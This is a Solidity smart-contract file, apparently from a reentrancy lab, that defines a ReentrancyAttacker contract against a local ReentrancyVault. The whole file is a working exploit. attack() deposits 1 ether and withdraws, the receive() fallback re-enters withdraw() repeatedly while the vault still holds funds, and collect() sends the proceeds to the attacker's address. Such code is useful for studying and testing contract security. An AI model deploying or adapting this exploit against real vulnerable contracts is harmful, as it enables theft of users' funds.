// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./ReentrancyVault.sol";

contract ReentrancyAttacker {
    ReentrancyVault public vault;
    address public owner;

    constructor(address payable _vault) {
        vault = ReentrancyVault(_vault);
        owner = msg.sender;
    }

    // fallback triggers reentrancy
    receive() external payable {
        uint256 vaultBal = address(vault).balance;
        if (vaultBal >= 1 ether) {
            vault.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        // deposit into vault from attacker
        vault.deposit{value: 1 ether}();
        // then call withdraw -> fallback reenters
        vault.withdraw();
    }

    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}